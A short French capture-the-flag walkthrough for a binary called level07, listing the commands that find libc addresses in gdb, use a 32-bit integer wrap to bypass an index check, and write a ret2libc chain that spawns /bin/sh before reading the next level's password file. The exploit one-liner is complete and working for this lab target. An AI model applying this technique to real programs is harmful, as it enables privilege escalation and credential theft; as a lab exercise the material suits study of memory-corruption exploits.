# Level07 -- commands

## Step 1 -- Recon

```bash
file ./level07
checksec ./level07
```

Purpose: confirmer **i386**, **NX enabled**, **Canary found**, **No PIE**, **Partial RELRO**.

---

## Step 2 -- Trouver les adresses libc sur la VM

```bash
gdb -q ./level07
```

```text
break main
run
p system
p exit
find &system, +9999999, "/bin/sh"
quit
```

Resultat :

| Symbole | Hex | Decimal |
|---------|-----|---------|
| system | `0xf7e6aed0` | **4159090384** |
| exit | `0xf7e5eb70` | **4159040368** |
| /bin/sh | `0xf7f897ec` | **4160264172** |

Convertir dans le shell : `printf '%u\n' 0xf7e6aed0`

---

## Step 3 -- Trouver l'index reel du saved EIP

```bash
./level07
```

```text
read
114
quit
```

Purpose: l'index **114** retourne `4158936339` = `0xf7e45513` = adresse de retour dans `__libc_start_main`. C'est le saved EIP de `main`. L'offset theorique (108) est faux a cause de `AND $0xfffffff0, %esp`.

---

## Step 4 -- Calcul des index overflow

Index 114 est bloque (`114 % 3 == 0`). On utilise le wrap 32-bit de `idx * 4` :

| Cible | Index overflow | idx % 3 |
|-------|---------------|---------|
| **system** (EIP) | **1073741938** | 1 |
| **exit** (ret) | **1073741939** | 2 |
| **/bin/sh** (arg) | **2147483764** | 1 |

---

## Step 5 -- Exploit final

```bash
( echo "store" ; echo "4159090384" ; echo "1073741938" ; echo "store" ; echo "4159040368" ; echo "1073741939" ; echo "store" ; echo "4160264172" ; echo "2147483764" ; echo "quit" ; cat ) | ./level07
```

Purpose:
- **store 1** : ecrit `system` sur le saved EIP (index 114 via overflow)
- **store 2** : ecrit `exit` comme adresse de retour (index 115)
- **store 3** : ecrit `/bin/sh` comme argument (index 116 via overflow k=2)
- **quit** : `main` fait `ret` -> `system("/bin/sh")` -> shell
- **`; cat`** : garde stdin ouvert pour le shell

---

## Step 6 -- Recuperer le flag

```bash
cat /home/users/level08/.pass
```

---

## Documentation

- Raisonnement : **`walkthrough`**
- Desassemblage : **`Ressources/disassembly.md`**
- Source reconstruite : **`source`**
